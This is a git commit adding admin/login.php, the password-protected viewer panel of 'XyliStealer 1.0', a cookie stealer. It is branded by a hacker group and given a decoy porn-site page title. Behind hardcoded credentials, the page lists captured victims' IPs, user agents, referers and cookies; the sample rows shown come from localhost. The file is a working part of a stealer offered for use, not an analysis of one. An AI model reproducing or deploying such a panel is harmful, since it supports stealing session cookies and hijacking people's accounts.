ae558ea3a35a9269cf832d97de9c5a2bf51e1007
Mr Zhu 404 <50517734+banghyuu@users.noreply.github.com>
2019-12-02 14:37:37 +0000

    Create login.php

---
+++ admin/login.php
@@ -0,0 +1,97 @@
+<?php /*
+__   __      _ _ _____ _             _             __   _____ 
+\ \ / /     | (_)  ___| |           | |           /  | |  _  |
+ \ V / _   _| |_\ `--.| |_ ___  __ _| | ___ _ __  `| | | |/' |
+ /   \| | | | | |`--. \ __/ _ \/ _` | |/ _ \ '__|  | | |  /| |
+/ /^\ \ |_| | | /\__/ / ||  __/ (_| | |  __/ |    _| |_\ |_/ /
+\/   \/\__, |_|_\____/ \__\___|\__,_|_|\___|_|    \___(_)___/ 
+        __/ |
+       |___/     By Xylitol  
+*/ ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="Content-Style-Type" CONTENT="text/css">
+<meta name="robots" content="index, follow, all" />
+<meta name="description" content="XyliStealer 1.0" />
+<meta name="keywords" content="XyliStealer 1.0" />
+<meta name="author" CONTENT="Xylitol">
+<title>XNXX | PORN HUB ©2019</title>
+<style type="text/css">
+<!--
+body,td,th {
+	color: #FF0033;
+}
+body {
+	background-color: #000000;
+}
+.Style1 {
+	color: #00CC33;
+	font-weight: bold;
+}
+-->
+</style></head>
+<body>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">MrZhu404 Was Here</span></div></td>
+  </tr>
+</table><center>
+<p>&nbsp;</p>
+<p><?php
+$LOGIN="mrzhu";  //login
+$PASSWD="admin";   //password
+if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
+<html>
+<body>
+<p><br />
+Cookies:</p>
+<table width="726" border="1">
+<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
+<tr><td>127.0.0.1</td><td>localhost</td><td>Mozilla/5.0 (Linux; Android 6.0.1; Andromax A26C4H Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</td><td>23/11/2019</td><td>23:52:09</td><td>Unspecified</td><td>No data</td></tr>
+<tr><td>127.0.0.1</td><td>localhost</td><td>Mozilla/5.0 (Linux; Android 6.0.1; Andromax A26C4H Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</td><td>24/11/2019</td><td>00:03:42</td><td>Unspecified</td><td>No data</td></tr>
+<!-- Breakpoint -->
+</table>
+<p>&nbsp;</p>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">GRESIK CYBER ARMY</span></div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+<?php } else { ?>
+<html>
+<body>
+<p>Login Dulu Cox !</p>
+<form name="connexion" action="<?php echo ($_SERVER['PHP_SELF']); ?>" method="post">
+  <table width="298" border="1">
+<tr>
+        <td width="102">Username </td>
+      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
+      </tr>
+      <tr>
+        <td>Password </td>
+        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
+      </tr>
+    </table>
+  <table width="298" border="0">
+    <tr>
+      <td><div align="center">
+        <input name="envoi" type="submit" value="ENTOD" />
+      </div></td>
+    </tr>
+  </table>
+  </form>
+  <p>&nbsp;</p>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">GRESIK CYBER ARMY</span></div></td>
+  </tr></center>
+</table>
+</body>
+</html>
+<?php } ?>
+
